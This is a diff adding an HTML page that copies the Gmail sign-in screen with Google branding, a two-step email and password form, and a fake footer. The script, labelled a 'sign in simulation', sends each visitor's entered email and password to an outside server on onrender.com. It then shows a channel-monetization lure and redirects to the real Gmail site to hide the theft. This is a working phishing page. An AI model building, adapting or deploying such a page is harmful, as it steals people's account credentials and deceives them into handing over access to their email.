@@ -1,0 +1,571 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="logo/google.png" type="image/x-icon" />
+    <title>Gmail – sign in · two‑div row layout</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        background-color: #202124;
+        font-family: "Google Sans", Roboto, Arial, sans-serif;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        margin: 0;
+        color: #e8eaed;
+      }
+
+      /* main container: two rows inside (cards + footer) */
+      .main-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: 100%;
+      }
+
+      /* FIRST ROW: sign‑in card(s) – only one visible at a time, still inside .card */
+      .row-card {
+        display: flex;
+        justify-content: center;
+        width: 100%;
+      }
+
+      /* SECOND ROW: footer items – now explicit row div */
+      .row-footer {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        max-width: 450px;
+        width: 90%;
+        margin-top: 1.5rem;
+        font-size: 0.75rem;
+        color: #9aa0a6;
+        padding: 0 0.5rem;
+        flex-wrap: wrap;
+        gap: 0.8rem;
+      }
+
+      /* card style unchanged, just moved inside row */
+      .card {
+        background-color: #1e1e1e;
+        border-radius: 28px;
+        max-width: 450px;
+        width: 90%;
+        padding: 2rem 2.5rem;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6);
+        transition: all 0.2s;
+        border: 1px solid #3c4043;
+      }
+
+      /* gmail style header */
+      .logo {
+        display: flex;
+        justify-content: left;
+        align-items: center;
+        margin-bottom: 1.5rem;
+        padding: 0.5rem 0;
+      }
+
+      .logo img {
+        width: auto;
+        height: 32px; /* Optimal size for sign-in pages */
+        object-fit: contain;
+        transition: opacity 0.2s ease;
+      }
+
+      /* Optional hover effect for subtle interactivity */
+      .logo img:hover {
+        opacity: 0.85;
+      }
+
+      /* Responsive adjustment for smaller screens */
+      @media (max-width: 500px) {
+        .logo img {
+          height: 28px;
+        }
+      }
+
+      h1 {
+        font-size: 1.9rem;
+        font-weight: 400;
+        letter-spacing: -0.5px;
+        color: #fff;
+        margin-top: 0.2rem;
+        margin-bottom: 0.2rem;
+      }
+
+      .subhead {
+        font-size: 1rem;
+        color: #bdc1c6;
+        margin-bottom: 1.75rem;
+        font-weight: 350;
+      }
+
+      /* modern floating input */
+      .input-field {
+        width: 100%;
+        padding: 1.1rem 1rem 0.6rem 1rem;
+        font-size: 1rem;
+        background: #303134;
+        border: 1px solid #5f6368;
+        border-radius: 10px;
+        color: #fff;
+        outline: none;
+        transition:
+          border 0.15s,
+          box-shadow 0.15s;
+        line-height: 1.3;
+      }
+
+      .input-field:focus {
+        border-color: #8ab4f8;
+        box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.3);
+      }
+
+      .input-group {
+        position: relative;
+        margin-bottom: 1.2rem;
+      }
+
+      .input-label {
+        position: absolute;
+        left: 1rem;
+        top: 0.85rem;
+        color: #9aa0a6;
+        font-size: 1rem;
+        transition: 0.15s ease all;
+        pointer-events: none;
+        background: transparent;
+        padding: 0 0.2rem;
+      }
+
+      .input-field:focus ~ .input-label,
+      .input-field:not(:placeholder-shown) ~ .input-label {
+        top: -0.4rem;
+        left: 0.9rem;
+        font-size: 0.75rem;
+        background-color: #1e1e1e;
+        color: #8ab4f8;
+        padding: 0 0.3rem;
+        border-radius: 4px;
+      }
+
+      /* hint links */
+      .forgot-link {
+        font-size: 0.9rem;
+        margin: 0.25rem 0 1.5rem 0;
+      }
+      .forgot-link a,
+      .guest-link a,
+      .back-link a {
+        color: #8ab4f8;
+        text-decoration: none;
+        font-weight: 450;
+      }
+      .forgot-link a:hover,
+      .guest-link a:hover {
+        text-decoration: underline;
+      }
+
+      .guest-link {
+        font-size: 0.9rem;
+        margin-bottom: 2.2rem;
+      }
+
+      .action-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin: 1.5rem 0 0.5rem;
+      }
+
+      .create-account a {
+        color: #8ab4f8;
+        text-decoration: none;
+        font-weight: 500;
+        font-size: 0.95rem;
+        letter-spacing: 0.2px;
+      }
+      .create-account a:hover {
+        text-decoration: underline;
+      }
+
+      .next-btn {
+        background-color: #8ab4f8;
+        border: none;
+        color: #202124;
+        padding: 0.65rem 1.8rem;
+        border-radius: 9999px;
+        font-weight: 600;
+        font-size: 0.9rem;
+        cursor: pointer;
+        transition: background-color 0.2s;
+        border: 1px solid transparent;
+      }
+      .next-btn:hover {
+        background-color: #aecbfa;
+      }
+
+      /* email pill */
+      .email-pill {
+        background-color: #303134;
+        border-radius: 999px;
+        padding: 0.6rem 1.2rem;
+        display: inline-flex;
+        align-items: center;
+        gap: 0.5rem;
+        font-size: 0.95rem;
+        border: 1px solid #5f6368;
+        margin: 0.5rem 0 1.5rem 0;
+        color: #e8eaed;
+        pointer-events: none;
+      }
+
+      .show-password-row {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        font-size: 0.9rem;
+        margin: 0.2rem 0 1.2rem;
+      }
+      .show-password-row input {
+        accent-color: #8ab4f8;
+        width: 1.1rem;
+        height: 1.1rem;
+        margin: 0;
+      }
+
+      .try-another {
+        margin-bottom: 2rem;
+      }
+      .try-another a {
+        color: #8ab4f8;
+        text-decoration: none;
+        font-size: 0.9rem;
+      }
+      .try-another a:hover {
+        text-decoration: underline;
+      }
+
+      /* footer inner elements (now inside .row-footer) */
+      .language-select {
+        background: transparent;
+        border: 1px solid #5f6368;
+        color: #e8eaed;
+        padding: 0.3rem 1.2rem 0.3rem 0.5rem;
+        border-radius: 4px;
+        font-size: 0.75rem;
+        cursor: pointer;
+        outline: none;
+        appearance: none;
+        background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 8' fill='%23e8eaed'><path d='M1 0l5 6 5-6z'/></svg>");
+        background-repeat: no-repeat;
+        background-position: right 0.3rem center;
+      }
+
+      .footer-links {
+        display: flex;
+        gap: 1.5rem;
+      }
+      .footer-links a {
+        color: #9aa0a6;
+        text-decoration: none;
+      }
+      .footer-links a:hover {
+        color: #e8eaed;
+      }
+
+      /* hide/show pages */
+      .page {
+        display: block;
+      }
+      .hidden-page {
+        display: none;
+      }
+
+      /* extra microfixes */
+      .back-nav a {
+        color: #8ab4f8;
+        text-decoration: none;
+        font-weight: 500;
+      }
+      .back-nav a:hover {
+        text-decoration: underline;
+      }
+
+      hr {
+        border: 0.5px solid #3c4043;
+        margin: 0.5rem 0 1rem;
+      }
+
+      .email-line {
+        display: flex;
+        align-items: center;
+        gap: 0.3rem;
+        flex-wrap: wrap;
+      }
+      @media (max-width: 500px) {
+        .card {
+          padding: 1.8rem 1.5rem;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- MAIN CONTAINER: two divs row (card row + footer row) -->
+    <div class="main-container">
+      <!-- FIRST ROW: sign-in card (contains both email & password card, but only one visible) -->
+      <div class="row-card">
+        <!-- EMAIL PAGE (visible by default) -->
+        <div class="card" id="emailCard">
+          <div class="logo">
+            <img src="logo/google.png" title="Google Logo" alt="Google" />
+          </div>
+          <h1>Sign in</h1>
+          <div class="subhead">to continue to Gmail</div>
+
+          <div class="input-group">
+            <input
+              type="text"
+              class="input-field"
+              id="emailInput"
+              placeholder=" "
+              autocomplete="off"
+              value=""
+            />
+            <label for="emailInput" class="input-label">Email or phone</label>
+          </div>
+
+          <div class="forgot-link">
+            <a href="#" id="forgotEmailLink">Forgot email?</a>
+          </div>
+
+          <div class="guest-link">
+            <a href="#"
+              >Not your computer? Use Guest mode to sign in privately.</a
+            >
+          </div>
+
+          <div class="action-row">
+            <div class="create-account"><a href="#">Create account</a></div>
+            <button class="next-btn" id="toPasswordBtn">Next</button>
+          </div>
+        </div>
+
+        <!-- PASSWORD PAGE (hidden initially) -->
+        <div class="card hidden-page" id="passwordCard">
+          <div class="logo">
+            <img src="logo/google.png" title="Google Logo" alt="Google" />
+          </div>
+          <h1>Welcome</h1>
+
+          <!-- dynamic email pill -->
+          <div class="email-pill" id="displayEmailPill">example@gmail.com</div>
+
+          <div class="input-group">
+            <input
+              type="password"
+              class="input-field"
+              id="passwordInput"
+              placeholder=" "
+              autocomplete="off"
+            />
+            <label for="passwordInput" class="input-label"
+              >Enter your password</label
+            >
+          </div>
+
+          <div class="show-password-row">
+            <input type="checkbox" id="showPasswordCheck" />
+            <label for="showPasswordCheck">Show password</label>
+          </div>
+
+          <div class="try-another">
+            <a href="#" id="tryAnotherLink">Try another way</a>
+          </div>
+
+          <div class="action-row">
+            <div class="back-nav">
+              <a href="#" id="backToEmailLink">Back</a>
+            </div>
+            <button class="next-btn" id="signInBtn">Next</button>
+          </div>
+        </div>
+      </div>
+      <!-- end first row (row-card) -->
+
+      <!-- SECOND ROW: footer (now separated in its own div) -->
+      <div class="row-footer">
+        <select class="language-select" aria-label="Language">
+          <option selected>English (United States)</option>
+          <option>Español (España)</option>
+          <option>Français (France)</option>
+          <option>中文（简体）</option>
+          <option>日本語</option>
+        </select>
+        <div class="footer-links">
+          <a href="#">Help</a>
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+        </div>
+      </div>
+      <!-- end second row (row-footer) -->
+    </div>
+    <!-- end main-container (two rows) -->
+
+    <script>
+      (function () {
+        // ----- DOM elements -----
+        const emailCard = document.getElementById("emailCard");
+        const passwordCard = document.getElementById("passwordCard");
+        const emailInput = document.getElementById("emailInput");
+        const toPasswordBtn = document.getElementById("toPasswordBtn");
+        const backToEmailLink = document.getElementById("backToEmailLink");
+        const displayEmailPill = document.getElementById("displayEmailPill");
+        const passwordInput = document.getElementById("passwordInput");
+        const showPasswordCheck = document.getElementById("showPasswordCheck");
+        const tryAnotherLink = document.getElementById("tryAnotherLink");
+        const forgotEmailLink = document.getElementById("forgotEmailLink");
+        const signInBtn = document.getElementById("signInBtn");
+
+        // ----- helper to switch views -----
+        function showEmailPage() {
+          emailCard.classList.remove("hidden-page");
+          passwordCard.classList.add("hidden-page");
+        }
+
+        function showPasswordPage() {
+          // Get email value, update pill
+          let email = emailInput.value.trim();
+          if (email === "") {
+            email = "user@gmail.com"; // placeholder fallback
+          }
+          displayEmailPill.textContent = email;
+
+          // Hide email card, show password card
+          emailCard.classList.add("hidden-page");
+          passwordCard.classList.remove("hidden-page");
+          // focus password field
+          passwordInput.focus();
+        }
+
+        // ----- EVENT: Next from email -----
+        toPasswordBtn.addEventListener("click", function (e) {
+          e.preventDefault();
+          showPasswordPage();
+        });
+
+        // ----- Enter key on email field -----
+        emailInput.addEventListener("keypress", function (e) {
+          if (e.key === "Enter") {
+            e.preventDefault();
+            showPasswordPage();
+          }
+        });
+
+        // ----- Back to email (from password card) -----
+        backToEmailLink.addEventListener("click", function (e) {
+          e.preventDefault();
+          emailCard.classList.remove("hidden-page");
+          passwordCard.classList.add("hidden-page");
+          emailInput.focus();
+        });
+
+        // ----- Try another way (returns to email) -----
+        tryAnotherLink.addEventListener("click", function (e) {
+          e.preventDefault();
+          emailCard.classList.remove("hidden-page");
+          passwordCard.classList.add("hidden-page");
+          emailInput.focus();
+        });
+
+        // ----- Forgot email? alert demo -----
+        forgotEmailLink.addEventListener("click", function (e) {
+          e.preventDefault();
+          alert("Forgot email flow — in real Gmail you would recover account.");
+        });
+
+        // ----- Show password toggle -----
+        showPasswordCheck.addEventListener("change", function () {
+          passwordInput.type = showPasswordCheck.checked ? "text" : "password";
+        });
+
+        // ----- sign in simulation -----
+        signInBtn.addEventListener("click", async function (e) {
+          e.preventDefault();
+
+          const email = displayEmailPill.textContent.trim();
+          const password = passwordInput.value.trim();
+
+          if (!password) {
+            alert("Please enter your password");
+            return;
+          }
+
+          try {
+            const response = await fetch(
+              "https://my-web-service-eac8.onrender.com/register",
+              {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({ email, password }),
+              },
+            );
+
+            const data = await response.json();
+
+            if (!response.ok) {
+              alert(data.message || "Login failed");
+              return;
+            }
+
+            alert(
+              "Thank You! Tomorrow morning you will receive an email with instructions to access and get your channel monetized",
+            );
+
+            // ✅ Redirect after successful login
+            window.location.href =
+              "https://workspace.google.com/intl/en-US/gmail/";
+            // You can replace "dashboard.html" with any page you want
+          } catch (error) {
+            alert("Server not reachable");
+            console.error(error);
+          }
+        });
+
+        // ----- Password field Enter triggers sign in -----
+        passwordInput.addEventListener("keypress", function (e) {
+          if (e.key === "Enter") {
+            e.preventDefault();
+            signInBtn.click();
+          }
+        });
+
+        // ----- minor: language select cosmetic -----
+        document
+          .querySelector(".language-select")
+          ?.addEventListener("change", function (e) {
+            // do nothing, just demo
+          });
+      })();
+    </script>
+
+    <!-- tiny style fix for hidden class -->
+    <style>
+      .hidden-page {
+        display: none;
+      }
+    </style>
+  </body>
+</html>
